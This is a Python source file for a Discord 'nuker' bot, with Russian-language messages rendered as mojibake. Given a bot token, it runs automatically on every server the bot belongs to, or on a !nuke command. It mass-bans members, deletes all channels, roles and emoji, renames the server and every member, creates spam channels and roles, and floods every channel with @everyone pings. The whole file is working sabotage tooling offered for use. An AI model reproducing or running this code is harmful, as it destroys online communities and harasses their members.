import ctypes
import discord
import os
import random
import string
import sys
from discord.ext import commands

kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

R = "\033[31m"  # –ö—Ä–∞—Å–Ω—ã–π
G = "\033[32m"  # –ó–µ–ª—ë–Ω—ã–π
Y = "\033[33m"  # –ñ–µ–ª—Ç—ã–π
W = "\033[37m"  # –ë–µ–ª—ã–π


def banner():
    print(f"\n\n{Y}"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπgithub.com/N0t-Ex1st\n"
          "\t\t\tùï∏ùñÜùïØùñäùïπ\n\n" + W)


def help_banner():
    print("\t\t\t\t\tùï≥ùñäùñëùñï\n"
          "\t\t\t\t\tùï≥ùñäùñëùñï\n"
          "\t\t\t\t\tùï≥ùñäùñëùñï\n"
          "\t\t\t\t\tùï≥ùñäùñëùñï\n"
          "\t\t\t\t\tùï≥ùñäùñëùñï\n"
          "\t\t\t\t\tùï≥ùñäùñëùñï\n\n")


def main(t, m, p, txt, n):
    client = commands.Bot(command_prefix='!', intents=discord.Intents.all())

    if m == "0":
        @client.event
        async def on_ready():
            for gi in client.guilds:
                print(f"–ù–∞—á–∏–Ω–∞—é —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞ {gi.name}")
                await ban(gi)
                await servn(gi)
                await delch(gi)
                await delr(gi)
                await dele(gi)
                await namech(gi, n)
                await chspam(gi)
                await rspam(gi)
                await spam(gi, txt)
            print(f"\n\n{G}–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω—é–∫–µ—Ä–∞, –Ω–∞–¥–µ—é—Å—å –≤–∞–º –ø–æ–Ω—Ä–∞–≤–∏–ª–æ—Å—å!{W}")
            sys.exit()
    if m == "1":
        print("–ñ–¥—É –∫–æ–º–º–∞–Ω–¥—É !nuke")

        @client.command()
        async def nuke(ctx):
            arg = ctx.guild
            for part in p:
                await servn(arg)
                if part == "f":
                    await ban(arg)
                    await delch(arg)
                    await delr(arg)
                    await dele(arg)
                    await namech(arg, n)
                    await chspam(arg)
                    await rspam(arg)
                    await spam(arg, txt)
                elif part == "b":
                    await ban(arg)
                elif part == "dc":
                    await delch(arg)
                elif part == "dr":
                    await delr(arg)
                elif part == "de":
                    await dele(arg)
                elif part == "s":
                    await spam(arg, txt)
                elif part == "nc":
                    await namech(arg, n)
                elif part == "cs":
                    await chspam(arg)
                elif part == "rs":
                    await rspam(arg)
            print(f"\n\n{G}–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω—é–∫–µ—Ä–∞, –Ω–∞–¥–µ—é—Å—å –≤–∞–º –ø–æ–Ω—Ä–∞–≤–∏–ª–æ—Å—å!{W}")
            sys.exit()

    try:
        client.run(t)
    except RuntimeError:
        print(f"\n\n{R}–¢–æ–∫–µ–Ω —Å–º–µ–Ω–∏–ª–∏, –≤–µ—Å–µ–ª—å–µ –∑–∞–∫–æ–Ω—á–∏–ª–æ—Å—å({W}")
        sys.exit()
    except Exception as ex:
        if str(ex) == "Shard ID None WebSocket closed with 4004":
            print(f"{R}–¢–æ–∫–µ–Ω —Å–º–µ–Ω–∏–ª–∏, –≤–µ—Å–µ–ª—å–µ –∑–∞–∫–æ–Ω—á–∏–ª–æ—Å—å({W}")
        elif "Shard ID None is requesting privileged intents" in str(ex):
            print(f"{R}–£ –±–æ—Ç–∞ –≤—ã–∫–ª—é—á–µ–Ω—ã intents. –í–∫–ª—é—á–∏—Ç–µ –∏—Ö –≤–æ –≤–∫–ª–∞–¥–∫–µ Bot –Ω–∞ —Å–∞–π—Ç–µ, –µ—Å–ª–∏ —ç—Ç–æ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞{W}")
        else:
            print(f"\n{R}–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞!\n–ù–∞–ø–∏—à–∏—Ç–µ help –≤ –∞—Ä–≥—É–º–µ–Ω—Ç, –¥–ª—è –ø–æ–º–æ—â–∏.{W}")
            print(R + "\nERROR!!!   " + str(ex) + W)
        sys.exit()
    except KeyboardInterrupt:
        print(f"\n\n{G}–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω—é–∫–µ—Ä–∞, –Ω–∞–¥–µ—é—Å—å –≤–∞–º –ø–æ–Ω—Ä–∞–≤–∏–ª–æ—Å—å!{W}")
        sys.exit()


async def ban(guild):
    ppl = 0
    bn = 0
    try:
        print("> –ù–∞—á–∏–Ω–∞–µ–º –∑–∞—á–∏—Å—Ç–∫—É –ª—é–¥–µ–π...")
        for member in guild.members:
            try:
                ppl += 1
                await member.ban()
                bn += 1
                print(f"–í –±–∞–Ω —á–µ—Ä—Ç–∏–∫–∞: {member}")
            except:
                print(f"{R}{member} - —Å–ª–∏—à–∫–æ–º —Å–∏–ª–µ–Ω{W}")
                continue

            print(f"> –ë—ã–ª–æ {ppl}  —á–µ–ª–æ–≤–µ–∫(–∞), –∑–∞–±–∞–Ω–∏–ª {bn} —á–µ–ª–æ–≤–µ–∫(–∞).")
    except:
        print(f"{R}–ù–µ —Å–º–æ–≥ –∑–∞–±–∞–Ω–∏—Ç—å{W}")


async def servn(guild):
    try:
        await guild.edit(name="Hello from Osiris!")
        print("> –¢–µ–ø–µ—Ä—å –∏–º—è —Å–µ—Ä–≤–µ—Ä–∞ –¥—Ä—É–≥–æ–µ!)")
    except:
        print(f"{R}–ù–µ —Å–º–æ–≥ –ø–æ–º–µ–Ω—è—Ç—å –∏–º—è —Å–µ—Ä–≤–µ—Ä–∞{W}")


async def delch(guild):
    try:
        ch = 0
        chd = 0
        print("> –ß–∏—Å—Ç–∏–º –∫–∞–Ω–∞–ª—ã...")
        for channel in guild.channels:
            ch += 1
            try:
                await channel.delete()
                print(f"–£–¥–∞–ª–∏–ª {channel}")
                chd += 1
            except:
                print(f"{R}–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å {channel}{W}")
                continue
        print(f"> –ë—ã–ª–æ {ch} –∫–∞–Ω–∞–ª–æ–≤, —É–¥–∞–ª–µ–Ω–Ω–æ {chd} –∫–∞–Ω–∞–ª–æ–≤.")
    except:
        print(f"{R}–ù–µ —É–¥–∞–ª–∏—Ç—å –∫–∞–Ω–∞–ª—ã{W}")


async def delr(guild):
    try:
        print("> –¢–µ–ø–µ—Ä—å —É–¥–∞–ª–∏–º —Ä–æ–ª–∏...")
        roles = guild.roles
        roles.pop(0)
        for role in roles:
            if guild.me.roles[-1] > role:
                try:
                    await role.delete()
                    print(f" –£–¥–∞–ª–∏–ª {role}")
                except:
                    print(f"{R} –ù–µ —Å–º–æ–≥ —É–¥–∞–ª–∏—Ç—å {role}{W}")
                    continue
            else:
                break
        print("> –£–¥–∞–ª–∏–ª —Ä–æ–ª–∏.")
    except:
        print(f"{R}–ù–µ —Å–º–æ–≥ —É–¥–∞–ª–∏—Ç—å —Ä–æ–ª–∏{W}")


async def dele(guild):
    try:
        counter = 0
        for emoji in list(guild.emojis):
            await emoji.delete()
            counter += 1
            print("–£–¥–∞–ª–∏–ª ", counter, " —Å–º–∞–π–ª–∏–∫–æ–≤", end="\r")
        print("–£–¥–∞–ª–∏–ª ", counter, " —Å–º–∞–π–ª–∏–∫–æ–≤")
        print("> –í—Å–µ, —Å–º–∞–π–ª–æ–≤ –±–æ–ª—å—à–µ –Ω–µ—Ç....")
    except:
        print(f"{R}–ù–µ —Å–º–æ–≥ —É–¥–∞–ª–∏—Ç—å —Å–º–∞–π–ª–∏–∫–∏{W}")


async def namech(guild, n):
    try:
        print("> –û—Ç–∫—Ä—ã–≤–∞—é —Ç–µ—Ç—Ä–∞–¥—å —Å–º–µ—Ä—Ç–∏...")

        def name_gen(nick):
            if nick == "":
                char = string.ascii_letters + string.digits
                return ''.join((random.choice(char) for _ in range(16)))
            else:
                return nick

        for member in guild.members:
            a = name_gen(n)
            try:
                await member.edit(nick=a)
                print(
                    f"–ü–æ–º–µ–Ω—è–ª –∏–º—è {member} –Ω–∞ {a}")
            except:
                print(f"{R}–ù–µ —Å–º–æ–≥ –ø–æ–º–µ–Ω—è—Ç—å –∏–º—è {member}{W}")
        print("> –í—Å–µ —Ç–µ–ø–µ—Ä—å –∞–Ω–æ–Ω–∏–∑–º—É—Å—ã.")
    except:
        print(f"> {R}–ù–µ —Å–º–æ–≥ –ø–æ–º–µ–Ω—è—Ç—å –∏–º–µ–Ω–∞{W}")


async def chspam(guild):
    try:
        counter = 0
        print("> –ù–∞—á–∏–Ω–∞–µ–º —Å–æ–∑–¥–∞–≤–∞—Ç—å –∫–∞–Ω–∞–ª—ã")
        for b in range(10):
            await guild.create_text_channel("Hello from Osiris!")
            counter += 1
            print("–°–æ–∑–¥–∞–ª ", counter, " –∫–∞–Ω–∞–ª–∞(–æ–≤)", end="\r")
        print("–°–æ–∑–¥–∞–ª ", counter, " –∫–∞–Ω–∞–ª–∞(–æ–≤)")
        print("> –ö–∞–Ω–∞–ª—ã —Å–æ–∑–¥–∞–Ω–Ω—ã")
    except:
        print(f"> {R}–ù–µ —Å–º–æ–≥ —Å–æ–∑–¥–∞—Ç—å –∫–∞–Ω–∞–ª—ã{W}")


async def rspam(guild):
    try:
        counter = 0
        print("> –°–ø–∞–º–∏–º —Ä–æ–ª—è–º–∏")
        for a in range(100):
            await guild.create_role(name="Hello from Osiris!")
            counter += 1
            print("–°–æ–∑–¥–∞–ª ", counter, " —Ä–æ–ª–µ–π", end="\r")
        print("–°–æ–∑–¥–∞–ª", counter, " —Ä–æ–ª–µ–π")
        print("> –ù–∞c–ø–∞–º–∏–ª —Ä–æ–ª—è–º–∏...")
    except:
        print(f"> {R}–ù–µ —Å–º–æ–≥ –Ω–∞—Å–ø–∞–º–∏—Ç—å —Ä–æ–ª—è–º–∏{W}")


async def spam(guild, stext):
    try:
        print("> –°–ø–∞–º –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω")
        for r in range(10):
            for channel in guild.text_channels:
                await channel.send("@everyone " + stext)
    except:
        print(f"> {R}–ù–µ —Å–º–æ–≥ –Ω–∞—Å–ø–∞–º–∏—Ç—å{W}")


if __name__ == "__main__":
    os.system('cls')
    try:
        if sys.argv[1] == "help":
            help_banner()
            print("–†–µ–∂–∏–º—ã –Ω—é–∫–µ—Ä–∞:\n\t–†—É—á–Ω–æ–π - –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–π —Ä–µ–∂–∏–º, –º–æ–∂–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–º–∞–Ω–¥–æ–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ."
                  "\n\t–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π - –≤—ã–ø–æ–ª–Ω–∏—Ç —Ñ—É–ª–ª –Ω—é–∫(—Å–º. –Ω–∏–∂–µ) –Ω–∞ –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö.\n\n–î–µ–π—Å—Ç–≤–∏—è "
                  "–Ω—é–∫–µ—Ä–∞: \n\tf - full nuke - –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö —Ä–µ–∂–∏–º–æ–≤.\n\tb - ban - –ë–∞–Ω –≤—Å–µ—Ö "
                  "—É—á–∞—Å—Ç–Ω–∏–∫–æ–≤, –∫–æ—Ç–æ—Ä—ã—Ö —Å–º–æ–∂–µ—Ç –∑–∞–±–∞–Ω–∏—Ç—å –±–æ—Ç.\n\tdc - del channels - –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö –∫–∞–Ω–∞–ª–æ–≤."
                  "\n\tdr - del roles - –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Ä–æ–ª–µ–π.\n\ts - spam - –°–ø–∞–º –∏ –ø–∏–Ω–≥ –≤–æ –≤—Å–µ—Ö"
                  " –∫–∞–Ω–∞–ª–∞—Ö.\n\tnc - name change - –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –≤—Å–µ–º —É—á–∞—Å—Ç–Ω–∏–∫–∞–º —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ —Å–ª—É—á–∞–π–Ω—ã–µ/–≤—ã–±—Ä–∞–Ω–Ω–æ–µ.\n\t"
                  "de - del emoji - –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —ç–º–æ–¥–∂–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.\n\tcs - channels spam - –°–æ–∑–¥–∞–Ω–∏–µ –±–æ–ª—å—à–æ–≥–æ –∫–æ–ª-–≤–∞"
                  " –ø—É—Å—Ç—ã—Ö –∫–∞–Ω–∞–ª–æ–≤.\n\trs - roles spam - –°–æ–∑–¥–∞–Ω–∏–µ –±–æ–ª—å—à–æ–≥–æ –∫–æ–ª-–≤–∞ –±–µ—Å–ø–æ–ª–µ–∑–Ω—ã—Ö —Ä–æ–ª–µ–π.")
        else:
            print(f"{R}–í–≤–µ–¥–µ–Ω –Ω–µ –≤–µ—Ä–Ω—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç{W}")
    except:
        try:
            banner()
            parts = text = name = None
            parts_list = ["f", "b", "dc", "dr", "de", "s", "nc", "cs", "rs"]
            token = input("–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω: ")
            mode = input("–í–≤–µ–¥–∏—Ç–µ —Ä–µ–∂–∏–º (–∞–≤—Ç–æ - 0, —Ä—É—á–Ω–æ–π - 1): ")
            if mode != "0" and mode != "1":
                raise Exception("mode")
            if mode == "1":
                parts = input("–í–≤–µ–¥–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏—è –Ω—é–∫–µ—Ä–∞(—Å–º. help, –≤–≤–æ–¥–∏—Ç—å —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é): ").split(",")
                for i in parts:
                    if i not in parts_list:
                        raise Exception("parts")
                    if i == "s" or i == "f":
                        text = input("–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è —Å–ø–∞–º–∞(Enter - –∞–≤—Ç–æ—Å–ø–∞–º): ")
                    if i == "nc" or i == "f":
                        name = input("–í–≤–µ–¥–∏—Ç–µ –∏–º—è –¥–ª—è –ª—é–¥–∏—à–µ–∫(Enter - —Ä–∞–Ω–¥–æ–º–Ω–æ–µ): ")
            elif mode == "0":
                text = input("–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è —Å–ø–∞–º–∞(Enter - –∞–≤—Ç–æ—Å–ø–∞–º): ")
                name = input("–í–≤–µ–¥–∏—Ç–µ –∏–º—è –¥–ª—è –ª—é–¥–∏—à–µ–∫(Enter - —Ä–∞–Ω–¥–æ–º–Ω–æ–µ): ")
            main(token, mode, parts, text, name)

        except Exception as e:
            if str(e) == "token":
                print(f"\n{R}–í–≤–µ–¥–µ–Ω –Ω–µ –≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω!\n–ù–∞–ø–∏—à–∏—Ç–µ help –≤ –∞—Ä–≥—É–º–µ–Ω—Ç, –¥–ª—è –ø–æ–º–æ—â–∏.{W}")
            elif str(e) == "parts":
                print(f"\n{R}–í–≤–µ–¥–µ–Ω(—ã) –Ω–µ –≤–µ—Ä–Ω—ã–π(–µ) –¥–µ–π—Å—Ç–≤–∏—è –Ω—é–∫–µ—Ä–∞!\n–ù–∞–ø–∏—à–∏—Ç–µ help –≤ –∞—Ä–≥—É–º–µ–Ω—Ç, –¥–ª—è –ø–æ–º–æ—â–∏.{W}")
            elif str(e) == "mode":
                print(f"\n{R}–í–≤–µ–¥–µ–Ω –Ω–µ –≤–µ—Ä–Ω—ã–π —Ä–µ–∂–∏–º –Ω—é–∫–µ—Ä–∞!\n–ù–∞–ø–∏—à–∏—Ç–µ help –≤ –∞—Ä–≥—É–º–µ–Ω—Ç, –¥–ª—è –ø–æ–º–æ—â–∏.{W}")
            else:
                print(f"\n{R}–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞!\n–ù–∞–ø–∏—à–∏—Ç–µ help –≤ –∞—Ä–≥—É–º–µ–Ω—Ç, –¥–ª—è –ø–æ–º–æ—â–∏.{W}")
                print(R + "\nERROR!!! " + str(e) + W)
            sys.exit()

        except KeyboardInterrupt:
            print(f"\n\n{G}–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω—é–∫–µ—Ä–∞, –Ω–∞–¥–µ—é—Å—å –≤–∞–º –ø–æ–Ω—Ä–∞–≤–∏–ª–æ—Å—å!{W}")
            sys.exit()
